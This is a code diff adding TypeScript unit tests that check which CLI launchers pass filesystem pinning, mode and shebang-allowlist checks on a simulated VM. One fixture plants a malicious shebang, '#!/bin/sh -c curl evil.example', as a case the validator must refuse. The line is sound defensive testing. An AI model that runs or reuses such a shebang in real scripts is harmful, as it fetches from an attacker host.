@@ -6,8 +6,12 @@ import {
   FdPinnedPathError,
   LINUX_CHILD_ENV_KEYS,
   type PinnedIdentity,
+  type PinningFileSystem,
   buildBrokerLaunch,
+  enumerateBrokerLaunchers,
+  launcherExecutable,
   pinBrokerLaunch,
+  pinnableLauncher,
   resolveLinuxRoot,
   validateRelativeCwd,
 } from './fdPinnedPaths.ts';
@@ -166,5 +170,140 @@ describe('fdPinnedPaths', () => {
     expect(symlinkRechecks.length).toBeGreaterThan(0);
     expect(symlinkRechecks.every((value) => value.startsWith('/proc/self/fd/'))).toBe(true);
     await pinned.close();
+  });
+});
+
+/**
+ * A VM filesystem, described as the nodes the pin walk will actually open. Each fixture states the
+ * machine it describes and nothing more: no path is special-cased, so a launcher appears in an
+ * enumeration exactly when the same walk that runs at launch would accept it.
+ */
+type FakeNode = { kind: 'file' | 'directory'; uid: number; gid: number; mode: number; content?: string };
+const PIN_IDENTITIES = { rootUid: 0, shellUid: 1000, shellGid: 1000, dashboardUid: 1001, dashboardGid: 1001 };
+
+/** The provisioned VM: both CLIs installed under the 0700 kb-shell home, bash where bash lives. */
+function vmTree(): Record<string, FakeNode> {
+  const rootDir = (mode = 0o755): FakeNode => ({ kind: 'directory', uid: 0, gid: 0, mode });
+  const homeDir = (mode: number): FakeNode => ({ kind: 'directory', uid: 1000, gid: 1000, mode });
+  const cli = (content: string): FakeNode => ({ kind: 'file', uid: 1000, gid: 1000, mode: 0o700, content });
+  return {
+    '/': rootDir(),
+    '/bin': rootDir(),
+    '/bin/bash': { kind: 'file', uid: 0, gid: 0, mode: 0o755, content: 'ELF' },
+    '/usr': rootDir(),
+    '/usr/bin': rootDir(),
+    '/usr/bin/node': { kind: 'file', uid: 0, gid: 0, mode: 0o755, content: 'ELF' },
+    '/var': rootDir(),
+    '/var/lib': rootDir(),
+    '/var/lib/kb-shell': { kind: 'directory', uid: 0, gid: 1000, mode: 0o750 },
+    '/var/lib/kb-shell/home': homeDir(0o700),
+    '/var/lib/kb-shell/home/.local': homeDir(0o750),
+    '/var/lib/kb-shell/home/.local/bin': homeDir(0o750),
+    // The real shape: npm-installed CLIs are node scripts, so enumeration must clear the shebang
+    // allowlist and pin the interpreter too, exactly as launch does.
+    '/var/lib/kb-shell/home/.local/bin/claude': cli('#!/usr/bin/env node\nrequire("./cli.js");\n'),
+    '/var/lib/kb-shell/home/.local/bin/codex': cli('#!/usr/bin/env node\nrequire("./cli.js");\n'),
+  };
+}
+
+function pinningFsOver(tree: Record<string, FakeNode>): PinningFileSystem {
+  let nextFd = 10;
+  let nextIno = 1n;
+  const openPaths = new Map<number, string>();
+  const inodes = new Map<string, bigint>();
+  const identityOf = (absolute: string): PinnedIdentity => {
+    const node = tree[absolute];
+    if (node === undefined) throw Object.assign(new Error('no such file'), { code: 'ENOENT' });
+    if (!inodes.has(absolute)) inodes.set(absolute, nextIno++);
+    return { dev: 1n, ino: inodes.get(absolute)!, uid: node.uid, gid: node.gid,
+      mode: (node.kind === 'directory' ? 0o040000 : 0o100000) | node.mode, kind: node.kind };
+  };
+  // The walk addresses every component through its pinned parent dirfd; resolve that back to the
+  // absolute path the fixture is written in, so the fixture never has to know about fd numbers.
+  const absoluteOf = (target: string): string => {
+    const viaFd = /^\/proc\/self\/fd\/(\d+)\/(.+)$/.exec(target);
+    if (viaFd === null) return target;
+    const parent = openPaths.get(Number(viaFd[1]));
+    if (parent === undefined) throw new Error('walk used an unpinned descriptor');
+    return parent === '/' ? `/${viaFd[2]!}` : `${parent}/${viaFd[2]!}`;
+  };
+  return {
+    open(target: string): number {
+      const absolute = absoluteOf(target);
+      identityOf(absolute);
+      const fd = nextFd++;
+      openPaths.set(fd, absolute);
+      return fd;
+    },
+    identity: (fd: number) => identityOf(openPaths.get(fd)!),
+    identityAt: (target: string) => identityOf(absoluteOf(target)),
+    readlink() { throw new Error('not a symlink'); },
+    read: (fd: number) => Buffer.from(tree[openPaths.get(fd)!]?.content ?? '', 'utf8'),
+    close: (fd: number) => { openPaths.delete(fd); },
+  };
+}
+
+describe('enumerateBrokerLaunchers', () => {
+  it('names the launchers a provisioned VM can actually pin, resolving paths from the launch table', async () => {
+    expect(launcherExecutable('shell')).toBe('/bin/bash');
+    expect(launcherExecutable('claude')).toBe('/var/lib/kb-shell/home/.local/bin/claude');
+    expect(launcherExecutable('codex')).toBe('/var/lib/kb-shell/home/.local/bin/codex');
+    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(vmTree())))
+      .toEqual(['shell', 'claude', 'codex']);
+  });
+
+  it('answers shell-only and one-CLI machines honestly instead of the full set', async () => {
+    const shellOnly = vmTree();
+    delete shellOnly['/var/lib/kb-shell/home/.local/bin/claude'];
+    delete shellOnly['/var/lib/kb-shell/home/.local/bin/codex'];
+    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(shellOnly))).toEqual(['shell']);
+
+    const claudeOnly = vmTree();
+    delete claudeOnly['/var/lib/kb-shell/home/.local/bin/codex'];
+    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(claudeOnly)))
+      .toEqual(['shell', 'claude']);
+  });
+
+  it('drops a launcher the pin validator refuses, even though the file is right there', async () => {
+    // 0755 inside the 0700 provider home: the pin's ownership/mode matrix refuses it. The binary
+    // EXISTS; the honest answer is still that it cannot be launched.
+    const worldReadable = vmTree();
+    worldReadable['/var/lib/kb-shell/home/.local/bin/codex'] = {
+      kind: 'file', uid: 1000, gid: 1000, mode: 0o755, content: '#!/usr/bin/env node\n',
+    };
+    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(worldReadable)))
+      .toEqual(['shell', 'claude']);
+    expect(await pinnableLauncher('codex', PIN_IDENTITIES, pinningFsOver(worldReadable))).toBe(false);
+
+    // Same rule for the shebang allowlist: an interpreter line that is not an approved absolute
+    // /bin or /usr/bin name drops the launcher rather than being executed to find out.
+    const badInterpreter = vmTree();
+    badInterpreter['/var/lib/kb-shell/home/.local/bin/claude'] = {
+      kind: 'file', uid: 1000, gid: 1000, mode: 0o700, content: '#!/bin/sh -c curl evil.example\n',
+    };
+    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(badInterpreter)))
+      .toEqual(['shell', 'codex']);
+  });
+
+  it('reports NOTHING when the enumeration itself throws — never a launcher, never a partial guess', async () => {
+    const onFire = (): never => { throw new Error('the filesystem is on fire'); };
+    const exploding: PinningFileSystem = {
+      open: onFire, identity: onFire, identityAt: onFire,
+      readlink: onFire, read: onFire, close: onFire,
+    };
+    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, exploding)).toEqual([]);
+    for (const launcher of ['shell', 'claude', 'codex'] as const) {
+      expect(await pinnableLauncher(launcher, PIN_IDENTITIES, exploding), launcher).toBe(false);
+    }
+
+    // A single launcher whose walk explodes takes only itself out of the set.
+    const healthy = pinningFsOver(vmTree());
+    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, {
+      ...healthy,
+      open: (target: string, flags: number) => {
+        if (target.endsWith('/codex')) throw new Error('EIO');
+        return healthy.open(target, flags);
+      },
+    })).toEqual(['shell', 'claude']);
   });
 });
